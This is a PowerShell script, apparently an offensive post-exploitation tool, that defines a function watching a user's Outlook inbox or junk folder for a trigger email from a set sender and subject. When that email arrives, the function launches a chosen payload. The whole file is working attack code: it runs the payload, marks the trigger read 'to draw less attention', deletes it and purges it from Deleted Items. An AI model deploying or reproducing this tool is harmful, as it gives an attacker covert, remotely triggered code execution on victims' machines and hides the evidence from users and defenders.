<#
.Synopsis
   Monitors Outlook for a specific email, and when it arrives, starts a payload.
.DESCRIPTION
   Surveys the users Outlook application at a regular interval, in either the inbox or junk folder, for a trigger email, and then starts the specified payload.
   For an email to trigger teh payload it must come from a predetermined email address with a specific Subject line.  They payload and delay interval can also be customized.
.NOTES
   Original concept code written by Matt Nelson
   https://enigma0x3.net/page/2/
.EXAMPLE
   New-OutlookTrigger -SenderEmail jdoe@mail.net -TriggerSubject Hey -Payload C:\PROGRA~1\COMMON~1\System\wab.exe -Delay 5
#>
function New-OutlookTrigger
{
    Param
    (
        # The sender's email address to filter on searching for the trigger
        [Parameter(Mandatory=$true)]
        $SenderEmail,

        # The exact subject line to trigger the payload
        [Parameter(Mandatory=$true)]
        $TriggerSubject,

        # The location on disk of the payload
        [Parameter(Mandatory=$true)]
        $Payload,

        # The time to wait betweem mailbox sweeps
        [Parameter(Mandatory=$true)]
        $Delay,

        # Sets the script to monitor the user's junk folder, otherwise, the inbox is monitored
        [switch]$Junk
    )

    Begin
    {
        # Define the required folder numbers
        $DeletedFolder = 3
        if($Junk)
        {
            $olFolderNumber = 23
        }
        else
        {
            $olFolderNumber = 6
        }
    }
    Process
    {
        While($True)
        {
            # Define the Outlook Namespace
            $outlook = new-object -com outlook.application;
            $ns = $outlook.GetNameSpace("MAPI");
            write-verbose "Starting mailbox search"
            # Search the desired folder for a trigger email and execute
            $Folder = $ns.GetDefaultFolder($olFolderNumber)
            $Emails = $Folder.items
            $Emails | foreach { 
                if($_.SenderEmailAddress -match $SenderEmail -and $_.subject -match $TriggerSubject)
                {
                    # Mark it as Read to draw less attention
                    $_.Unread = $false
                    # Start the payload
                    Write-Verbose "Trigger found, starting payload $payload"
                    Start-Process $payload
                    # Delete the trigger email and set the variable that tells the script to clean the deleted items folder
                    $_.Delete()
                    $Cleaned = $false
                }
            }
            Write-Verbose "Cleaned variable set to $Cleaned"
            if($Cleaned -eq $false)
            {
                # Remove trigger email from Deleted Items
                Write-Verbose "Detected cleaned variable set to false, Starting cleanup procedures"
                $deleted = $ns.GetDefaultFolder($DeletedFolder)
                $Emails = $deleted.items
                $Emails | foreach { 
                    if($_.SenderEmailAddress -match $SenderEmail -and $_.subject -match $TriggerSubject)
                    {
                        Write-Verbose "Deleted trigger found, cleaning up"
                        $_.Delete()
                    }
                }
                $Cleaned = $true
                Write-Verbose "Cleanup complete, cleaned variable set to $Cleaned"
            }
            # This determines how often the script checks in. Lower sleep time == more noise  
            Write-Verbose "Starting Sleep cycle"
            Start-Sleep -s $Delay
        }
    }
    End
    {
    }
}